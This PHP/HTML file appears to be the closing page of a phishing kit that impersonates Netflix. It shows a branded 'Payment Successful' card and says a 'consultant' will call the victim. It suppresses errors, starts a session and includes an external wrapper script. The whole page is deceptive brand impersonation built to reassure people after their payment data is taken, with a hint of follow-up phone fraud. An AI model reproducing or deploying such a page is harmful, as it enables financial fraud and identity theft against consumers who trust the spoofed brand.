<?php
@error_reporting(0);
ini_set('display_errors', '1');
session_start();
require_once "./wrapper.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#ffffff">
  <title>Payment Successful │ Netflix</title>
  <link rel="canonical" href="https://example.com/success">
  <meta name="referrer" content="no-referrer">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Netflix Sans', 'Helvetica Neue', 'Segoe UI', Roboto, Ubuntu, sans-serif;
      background: linear-gradient(180deg, #ffffff 0%, #f7f7f7 50%, #efefef 100%);
      color: #141414;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 1.5rem;
      text-align: center;
      line-height: 1.6;
    }

    .card {
      background: #ffffff;
      border-radius: 18px;
      box-shadow: 0 12px 48px rgba(0, 0, 0, 0.10), 0 2px 8px rgba(0, 0, 0, 0.05);
      padding: 2.75rem 2.25rem;
      max-width: 540px;
      width: 100%;
      animation: fadeIn 0.6s ease-out;
      border: 1px solid #f2f2f2;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(14px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    /* Netflix logo wrapper */
    .netflix-logo {
      display: block;
      margin: 0 auto 2rem;
      width: 200px;
      max-width: 74%;
      height: auto;
    }

    /* Success check badge */
    .check-badge {
      width: 76px;
      height: 76px;
      margin: 0 auto 1.75rem;
      background: linear-gradient(135deg, #e50914 0%, #b20710 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 8px 24px rgba(229, 9, 20, 0.35), 0 0 0 8px rgba(229, 9, 20, 0.08);
      animation: pop 0.5s ease-out;
    }

    @keyframes pop {
      0%   { transform: scale(0.6); opacity: 0; }
      70%  { transform: scale(1.08); }
      100% { transform: scale(1); opacity: 1; }
    }

    .check-badge svg {
      width: 38px;
      height: 38px;
      stroke: #ffffff;
      stroke-width: 3.5;
      stroke-linecap: round;
      stroke-linejoin: round;
      fill: none;
    }

    .status-title {
      font-size: 1.85rem;
      font-weight: 800;
      color: #141414;
      margin-bottom: 0.5rem;
      letter-spacing: -0.5px;
    }

    .status-title span {
      color: #e50914;
    }

    .divider {
      width: 64px;
      height: 3px;
      background: linear-gradient(90deg, #e50914, #ff3b30);
      border-radius: 2px;
      margin: 1.25rem auto 1.75rem;
    }

    .message {
      font-size: 1.0625rem;
      color: #404040;
      margin-bottom: 0.85rem;
      max-width: 44ch;
      margin-left: auto;
      margin-right: auto;
    }

    .message:last-of-type {
      margin-bottom: 0;
    }

    .note {
      font-size: 0.9375rem;
      color: #737373;
      margin-top: 1.75rem;
    }

    .note strong {
      color: #e50914;
      font-weight: 700;
    }

    @media (max-width: 480px) {
      .card {
        padding: 2.25rem 1.5rem;
      }

      .status-title {
        font-size: 1.5rem;
      }

      .message {
        font-size: 1rem;
      }

      .netflix-logo {
        width: 160px;
      }

      .check-badge {
        width: 66px;
        height: 66px;
      }

      .check-badge svg {
        width: 32px;
        height: 32px;
      }
    }
  </style>
</head>
<body>
  <main class="card" role="main">
    <!-- Netflix logo (official SVG from Wikimedia) -->
    <img
      class="netflix-logo"
      src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg"
      alt="Netflix"
      onerror="this.style.display='none';document.getElementById('fallbackLogo').style.display='block';"
    />

    <!-- Inline fallback logo (only shows if image fails) -->
    <svg
      id="fallbackLogo"
      class="netflix-logo"
      style="display:none;"
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 1024 276.742"
      aria-label="Netflix"
    >
      <path fill="#e50914" d="M140.803 258.904c-15.404 2.705-31.079 3.516-47.294 5.676L44.051 119.724v151.073C28.647 272.418 14.594 274.58 0 276.742V0h41.08l56.212 157.021V0h43.511v258.904zm85.131-157.558c16.757 0 42.431-.811 57.835-.811v43.24c-19.189 0-41.619 0-57.835.811v64.322c25.405-1.621 50.809-3.785 76.482-4.596v41.617l-119.724 9.461V0h119.724v43.241h-76.482v58.105zm237.284-58.104h-44.862V198.908c-14.594 0-29.188 0-43.239.539V43.242h-44.862V0H463.22l-.002 43.242zm70.266 55.132h59.187c16.24 0 18.453 14.59 18.453 32.188v0c0 17.06-2.213 31.65-18.453 31.65h-59.187V98.374zm-43.511-43.241v217.511h43.511v-82.865h30.694c47.834 0 56.752-31.514 56.752-72.261 0-40.476-8.918-62.385-56.752-62.385h-74.205zm221.41 41.55h-44.862V244.4c-14.594 0-29.188 0-43.239.539V43.242h-44.862V0h132.963v43.242zm-397.751 38.762h-43.511V0h43.511v176.447zm-43.511-38.762h59.187c16.24 0 18.453 14.59 18.453 32.188v0c0 17.06-2.213 31.65-18.453 31.65h-59.187V98.374z"/>
    </svg>

    <!-- Success check badge -->
    <div class="check-badge" aria-hidden="true">
      <svg viewBox="0 0 24 24">
        <polyline points="20 6 9 17 4 12" />
      </svg>
    </div>

    <h1 class="status-title">Payment <span>Successful</span></h1>

    <div class="divider" aria-hidden="true"></div>

    <p class="message">A receipt of payment will be delivered to your email address.</p>
    <p class="message">Should there be any issues regarding this payment or delivery, one of our consultants will call you.</p>

    <p class="note">Thank you for choosing <strong>Netflix</strong>.</p>
  </main>
</body>
</html>
